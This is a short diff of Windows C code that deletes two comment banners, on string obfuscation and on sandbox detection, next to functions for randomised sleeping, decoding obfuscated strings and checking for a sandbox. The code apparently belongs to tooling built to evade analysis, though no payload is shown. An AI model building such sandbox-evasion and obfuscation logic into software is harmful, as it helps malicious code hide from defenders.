@@ -82,10 +82,6 @@ VOID AdaptiveSleep(DWORD baseMs)
     RandomSleep(minMs, maxMs);
 }
 
-// ============================================================================
-// STRING OBFUSCATION
-// ============================================================================
-
 VOID DeobfuscateString(BYTE* obfuscated, SIZE_T length, BYTE key, char* output)
 {
     for (SIZE_T i = 0; i < length; i++) {
@@ -93,10 +89,6 @@ VOID DeobfuscateString(BYTE* obfuscated, SIZE_T length, BYTE key, char* output)
     }
     output[length] = '\0'; // Null terminator
 }
-
-// ============================================================================
-// DÉTECTION D'ENVIRONNEMENT (versions légères pour obfuscation.c)
-// ============================================================================
 
 BOOL IsRunningInSandbox(void)
 {
